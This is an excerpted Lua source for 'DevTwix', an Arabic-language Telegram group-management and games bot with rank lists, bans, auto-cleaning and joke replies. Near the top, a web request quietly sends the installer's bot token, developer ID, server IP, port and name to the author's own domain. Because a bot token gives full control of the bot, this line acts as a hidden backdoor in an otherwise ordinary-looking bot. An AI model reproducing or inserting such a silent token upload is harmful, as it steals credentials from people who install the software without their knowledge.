------------------------------------------------
-- This Source Was Developed By (HmD) @IQ_HmD.--
...
https.request("https://apiHmD.ml/config.php?Get=DevTwix&DevId="..DevHmD:get(Server.."IdDevTwix").."&TokenBot="..DevHmD:get(Server.."TokenDevTwix").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
...
NameBot = (DevHmD:get(DevTwix..'HmD:NameBot') or 'تويكسس')
--     Source DevTwix     --
...
local Status = DevHmD:sismember(DevTwix..'HmD:ManagerAll:',msg.sender_user_id_) 
...
local Status = DevHmD:sismember(DevTwix..'HmD:AdminAll:',msg.sender_user_id_) 
...
------ Vip Member All ------
function VipAll(msg) 
local Status = DevHmD:sismember(DevTwix..'HmD:VipAll:',msg.sender_user_id_) 
...
var = true  
elseif DevHmD:sismember(DevTwix..'HmD:ManagerAll:', user_id) then
var = true  
elseif DevHmD:sismember(DevTwix..'HmD:AdminAll:', user_id) then
var = true  
elseif DevHmD:sismember(DevTwix..'HmD:VipAll:', user_id) then
var = true  
...
local url,res = https.request('https://apiHmD.ml/SourceCh.php?id='..msg.sender_user_id_)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(data.ChatMember.DevTwix).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Var = true
end
return Var
...
EditMsg(Chat_Id2, Msg_Id2, "⌁︙*صاحب الحظ* ↫ ["..UserName.."]\n⌁︙*متويكس لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
...
DevHmD:del(DevTwix..'HmD:Text:GpTexts'..Abbs..data.chat_id_)
DevHmD:srem(DevTwix..'HmD:Manager:GpRedod'..data.chat_id_,Abbs)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Abbs = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevHmD:smembers(DevTwix..'HmD:Text:GpTexts'..Abbs..data.chat_id_)
...
if text and text:match('^'..(DevHmD:get(DevTwix..'HmD:NameBot') or "تويكسس")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevHmD:get(DevTwix..'HmD:NameBot') or "تويكسس")..' ','')
end
...
if DevHmD:sismember(DevTwix.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrHmD = DevHmD:get(DevTwix.."Comd:New:rt:HmD:"..DEV_ABBAS..msg.chat_id_)
if mrHmD == "مميز" and VipMem(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Dev_Prox')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevHmD:set(DevTwix.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
...
if mrHmD == "مميز" and VipMem(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'Dev_Prox')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
...
if text == '/play' or text == '• رجوع •' or text == '/free' then
local Sudo_Welcome = '*☨︙مرحبأ بك يا عزيزي اليك خدمات البوت*'
local key = {
{'✦ العاب تسلية ✦'},
...
{{text="☨ السورس .",url="https://t.me/DevTwix"},{text="☨ لتنصيب بوت .",url="https://t.me/VLVLVI"}},{{text="☨ المطور .",url="t.me/"..(dp.username_ or "DevTwix")}},
}
...
Dev_HmD(msg.sender_user_id_, msg.id_, 1, '⌁︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "Dev_Prox")..')', 1, 'md') 
...
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = DevTwix,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
...
if DevHmD:get(DevTwix.."HmD:Photo:BotWelcome") then HmDPhoto = DevHmD:get(DevTwix.."HmD:Photo:BotWelcome") elseif abbas.photos_[0] then HmDPhoto = abbas.photos_[0].sizes_[1].photo_.persistent_id_ else HmDPhoto = nil end 
...
local BotName = (DevHmD:get(DevTwix.."HmD:NameBot") or 'تويكسس')
...
Dev_HmD( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..NUM..'\n⌁︙*متويكس لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
...
NameBot = (DevHmD:get(DevTwix..'HmD:NameBot') or 'تويكسس')
local DevTwixTEAM = {"لتكول بوت اسمي "..NameBot.." 😒🔪","اسمي القميل "..NameBot.." 😚♥️","عندي اسم تره 😒💔","صيحولي "..NameBot.." كافي بوت 😒🔪","انت البوت لك 😒💔"} 
Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTEAM[math.random(#DevTwixTEAM)] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevHmD:get(DevTwix..'HmD:NameBot') or 'تويكسس') 
local DevTwixTEAM = {"اسمي القميل "..NameBot.." 😚♥️","هلاا يروحيي وياكك "..NameBot.." 😻♥️"} 
Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTEAM[math.random(#DevTwixTEAM)] , 1, 'html') 
return false
end
if text and text == (DevHmD:get(DevTwix..'HmD:NameBot') or 'تويكسس') then 
NameBot = (DevHmD:get(DevTwix..'HmD:NameBot') or 'تويكسس')
local DevTwixTEAM = {'😸♥️ هلا كلبي وياك '..NameBot..' تفضل','ترةه مصختهاا احجيي شرايد 😕😒💔','اطلقق واحدد يصيح '..NameBot..' 😻♥️','خبصتت امنةة شتريدد عااد 🤧😒💔'} 
Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTEAM[math.random(#DevTwixTEAM)] , 1, 'html') 
return false 
end
...
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevHmD:del(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_HmD(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع نقاطك', 1, 'md') end
--     Source DevTwix     --
...
DevTwixTEAM = '⌁︙متويكس لقد ربحت في اللعبه \n⌁︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTEAM, 1, 'md')
...
if DevHmD:get(DevTwix.."HmD:Left:Bot"..DevTwix) and not SecondSudo(msg) then
...
function DevTwixTEAM(extra,result,success)
if DevHmD:get(DevTwix.."HmD:Send:Bot"..DevTwix) and not SecondSudo(msg) then 
...
⌁︙[Developer](https://t.me/IQ_HmD)
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Tws DevTwix](https://t.me/IQA_bot)
]]
...
local DevText = DevHmD:get(DevTwix.."DevText")
if DevHmD:get(DevTwix.."HmD:ChId") then DevCh = '\n⌁︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
...
if DevHmD:sismember(DevTwix..'HmD:ManagerAll:',result.sender_user_id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevHmD:sismember(DevTwix..'HmD:AdminAll:',result.sender_user_id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevHmD:sismember(DevTwix..'HmD:VipAll:',result.sender_user_id_) then
...
DevHmD:srem(DevTwix..'HmD:ManagerAll:', result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:AdminAll:', result.sender_user_id_)
DevHmD:srem(DevTwix..'HmD:VipAll:', result.sender_user_id_)
...
sudobot = 'المطورين • ' else sudobot = '' end
if DevHmD:sismember(DevTwix..'HmD:ManagerAll:',result.id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevHmD:sismember(DevTwix..'HmD:AdminAll:',result.id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevHmD:sismember(DevTwix..'HmD:VipAll:',result.id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
...
DevHmD:srem(DevTwix..'HmD:ManagerAll:', result.id_)
DevHmD:srem(DevTwix..'HmD:AdminAll:', result.id_)
DevHmD:srem(DevTwix..'HmD:VipAll:', result.id_)
...
DevHmD:sadd(DevTwix..'HmD:ManagerAll:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:ManagerAll:',result.id_)
...
DevHmD:sadd(DevTwix..'HmD:ManagerAll:',user)
...
DevHmD:srem(DevTwix..'HmD:ManagerAll:',user)
...
function raf_reply(extra, result, success)
DevHmD:sadd(DevTwix..'HmD:AdminAll:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:AdminAll:',result.id_)
...
DevHmD:sadd(DevTwix..'HmD:AdminAll:',user)
...
DevHmD:srem(DevTwix..'HmD:AdminAll:',user)
...
function raf_reply(extra, result, success)
DevHmD:sadd(DevTwix..'HmD:VipAll:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevHmD:sadd(DevTwix..'HmD:VipAll:',result.id_)
...
DevHmD:sadd(DevTwix..'HmD:VipAll:',user)
...
DevHmD:srem(DevTwix..'HmD:VipAll:',user)
...
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:ProSet"..msg.chat_id_) then 
...
if text == "راسلني" then
DevTwixTEAM = {"ها هلاو","انطق","كول حبي","تفضل"};
...
if not Constructor(msg) and DevHmD:get(DevTwix.."HmD:Lock:MuteTked"..msg.chat_id_) then 
...
if DevHmD:sismember(DevTwix..'HmD:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
...
if DevHmD:sismember(DevTwix..'HmD:SecondSudo:',result.id_) and not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
return false 
end
if result.id_ then
...
if DevHmD:sismember(DevTwix..'HmD:SecondSudo:',user) and not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
...
if DevHmD:get(DevTwix..'HmD:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then DevHmD:sadd(DevTwix.."HmD:cleaner"..msg.chat_id_, msg.id_) else DevHmD:sadd(DevTwix.."HmD:cleaner"..msg.chat_id_, msg.id_) end end end
...
local UserName = (dp.username_ or "Dev_Prox")
Dev_HmD(msg.chat_id_, msg.id_, 1, "⌁︙مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
end,nil)   
end
end
end,nil)   
...
local List = DevHmD:smembers(DevTwix..'HmD:ManagerAll:')
...
local List = DevHmD:smembers(DevTwix..'HmD:VipAll:')
...
if text == 'تحويل' and not DevHmD:get(DevTwix..'HmD:Thwel:HmD'..msg.chat_id_) and SourceCh(msg) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
...
function DevTwixTEAM(extra,abbas,success)
...
Dev_HmD(msg.chat_id_, msg.id_, 1, '⌁︙قم بتحديد عدد اكبر من 50 واصغر من 200 للحذف التلقائي', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع ↫ *'..Num..'* من الميديا للحذف التلقائي', 1, 'md')
DevHmD:set(DevTwix..'HmD:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevHmD:get(DevTwix..'HmD:Lock:Clean'..msg.chat_id_) then
...
if DevHmD:scard(DevTwix.."HmD:cleaner"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevHmD:smembers(DevTwix.."HmD:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
...
DevHmD:del(DevTwix..'HmD:AdminAll:')
end
...
DevHmD:del(DevTwix..'HmD:ManagerAll:')
end
...
if text and text:match("^انطق (.*)$") and not DevHmD:get(DevTwix..'HmD:Antk:HmD'..msg.chat_id_) and SourceCh(msg) then
...
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and DevHmD:get(DevTwix..'HataNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and DevHmD:get(DevTwix..'RjolaNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and DevHmD:get(DevTwix..'AnothaNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and DevHmD:get(DevTwix..'StupidNsba:HmD'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
if text == "غنيلي" and not DevHmD:get(DevTwix..'HmD:Audios:HmD'..msg.chat_id_) and SourceCh(msg) then
...
{{text = '⌁ DevTwix TeAM .',url="t.me/Dev_Prox"}},
}
...
HmDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevTwixTEAM, 14, string.len(msg.sender_user_id_))
DevHmD:del(DevTwix..'HmD:Lock:Stupid'..msg.chat_id_)
end
if text == 'تعطيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
local DevTwixTEAM = '⌁︙اهلا عزيزي ↫ '..HmDRank(msg)..' \n⌁︙تم تعطيل اوامر التحشيش'
HmDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevTwixTEAM, 14, string.len(msg.sender_user_id_))
DevHmD:set(DevTwix..'HmD:Lock:Stupid'..msg.chat_id_,true)
end
--     Source DevTwix     --
...
ConstructorHmD = "["..HmD.first_name_.."](T.me/"..(HmD.username_ or "Dev_Prox")..")"
else 
...
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './DevTwix.lua', '⌁︙نسخة ملف سورس تويكسس',dl_cb, nil)
end end
--     Source DevTwix     --
...
Dev_HmD(msg.chat_id_, msg.id_, 1, '⌁︙جاري تحديث سورس تويكسس', 1, 'md') 
...
local Get_Files, res = https.request("https://raw.githubusercontent.com/DevTwixTEAM/DevTwixFiles/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n⌁︙قائمة ملفات متجر سورس تويكسس\n⌁︙الملفات المتوفره حاليا ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
...
local GetJson, Res = https.request("https://raw.githubusercontent.com/DevTwixTEAM/DevTwixFiles/master/DevTwixFiles/"..FileName)
if Res == 200 then
...
Dev_HmD(msg.chat_id_, msg.id_, 1, '⌁︙Channel ↬ [@Dev_Prox]', 1, 'md')    
end 
--     Source DevTwix     --
...
if DevHmD:get(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
